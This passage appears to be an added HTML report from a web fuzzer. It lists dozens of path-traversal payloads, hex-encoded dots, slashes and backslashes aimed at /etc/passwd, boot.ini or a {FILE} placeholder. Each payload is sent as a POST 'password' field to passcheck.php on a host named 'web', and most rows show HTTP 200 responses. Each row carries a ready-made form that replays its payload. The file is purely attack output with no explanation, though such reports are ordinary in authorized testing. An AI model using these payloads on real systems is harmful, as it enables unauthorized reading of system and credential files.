+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e/0x2e0x2e/0x2e0x2e/boot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e/0x2e0x2e/0x2e0x2e/boot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00066</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\/etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00068</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00077</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e/0x2e0x2e//etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e/0x2e0x2e//etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00079</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e/0x2e0x2e/{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e/0x2e0x2e/{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00083</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00091</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f/etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00104</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x2f{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x2f{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00103</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x2f/etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x2f/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00102</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x2fboot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x2fboot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00101</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x2f0x2e0x2e0x2f{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x2f0x2e0x2e0x2f{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00100</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x2f0x2e0x2e0x2f/etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x2f0x2e0x2e0x2f/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00099</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x2f0x2e0x2e0x2fboot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x2f0x2e0x2e0x2fboot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00098</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00097</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f/etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00096</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fboot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fboot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00095</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00094</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f/etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00093</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fboot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fboot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00090</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fboot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fboot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00092</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00089</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00088</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f/etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00087</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fboot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fboot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00086</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00085</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f/etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00082</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f/etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00084</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fboot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fboot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00081</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fboot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fboot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00078</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e\0x2e0x2e\/etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e\0x2e0x2e\/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00080</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e\0x2e0x2e\{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e\0x2e0x2e\{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00105</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5cboot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5cboot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00107</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00111</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5cboot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5cboot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00119</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00126</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x5cboot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x5cboot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00128</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x5c{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x5c{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00129</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e/boot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e/boot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00130</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e\boot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e\boot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00131</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e//etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e//etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00132</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e\/etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e\/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00127</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x5c/etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x5c/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00125</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x5c0x2e0x2e0x5c{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x5c0x2e0x2e0x5c{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00133</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e/{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e/{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00134</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e\{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e\{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00135</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2fboot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2fboot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00136</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f/etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00137</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00138</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2fboot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2fboot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00139</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f/etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00140</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00141</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x2f..0x2f..0x2f..0x2f..0x2f..0x2fboot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x2f..0x2f..0x2f..0x2f..0x2f..0x2fboot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00142</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f/etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00143</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00144</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x2f..0x2f..0x2f..0x2f..0x2fboot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x2f..0x2f..0x2f..0x2f..0x2fboot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00145</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x2f..0x2f..0x2f..0x2f..0x2f/etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x2f..0x2f..0x2f..0x2f..0x2f/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00146</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x2f..0x2f..0x2f..0x2f..0x2f{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x2f..0x2f..0x2f..0x2f..0x2f{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00147</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x2f..0x2f..0x2f..0x2fboot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x2f..0x2f..0x2f..0x2fboot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00148</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x2f..0x2f..0x2f..0x2f/etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x2f..0x2f..0x2f..0x2f/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00149</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x2f..0x2f..0x2f..0x2f{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x2f..0x2f..0x2f..0x2f{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00150</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x2f..0x2f..0x2fboot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x2f..0x2f..0x2fboot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00151</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x2f..0x2f..0x2f/etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x2f..0x2f..0x2f/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00152</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x2f..0x2f..0x2f{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x2f..0x2f..0x2f{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00153</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x2f..0x2fboot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x2f..0x2fboot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00154</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x2f..0x2f/etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x2f..0x2f/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00155</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x2f..0x2f{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x2f..0x2f{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00156</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x2fboot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x2fboot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00157</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
